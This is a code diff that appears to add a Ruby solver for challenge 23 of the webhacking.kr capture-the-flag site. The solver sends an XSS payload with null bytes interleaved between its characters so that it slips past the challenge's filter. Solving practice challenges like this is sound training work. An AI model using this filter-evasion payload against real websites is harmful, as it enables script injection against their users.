@@ -595,6 +595,27 @@ module WebhackingKR
   end
 
   ##
+  # Challenge 23
+  class Challenge23 < ChallengeBase
+    CHALLENGE = 23
+
+    PATH = '/challenge/bonus-3/'
+    PARAM_QUERY = 'code'
+    PAYLOAD = '<script>alert(1);</script>'
+
+    def exec
+      payload = String.new
+      PAYLOAD.each_char.with_index do |char, i|
+        payload << "#{char}\x00"
+      end
+      query = URI.encode_www_form(PARAM_QUERY => payload)
+      log('Sending payload')
+      response = get("#{PATH}?#{query}")
+      check(response.body)
+    end
+  end
+
+  ##
   # Challenge 32
   class Challenge32 < ChallengeBase
     CHALLENGE = 32
